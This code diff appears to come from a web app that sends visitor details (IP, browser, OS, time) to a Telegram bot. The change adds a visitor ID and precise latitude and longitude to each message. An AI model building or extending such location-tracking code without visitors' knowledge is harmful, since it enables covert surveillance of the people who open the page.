@@ -9,6 +9,7 @@ export interface DeviceInfo {
   browser: string;
   os: string;
   timestamp: string;
+  visitorId: string;
 }
 
 export interface LocationInfo {
@@ -59,11 +60,13 @@ export async function sendTelegramMessage(
 
     // Send device info
     const message = `
-Device Information:
+New Visitor Access:
+ID: ${data.deviceInfo.visitorId}
 IP: ${data.deviceInfo.ip}
 Browser: ${data.deviceInfo.browser}
 OS: ${data.deviceInfo.os}
 Time: ${new Date(data.deviceInfo.timestamp).toLocaleString()}
+Location: ${data.location.latitude}, ${data.location.longitude}
     `.trim()
 
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
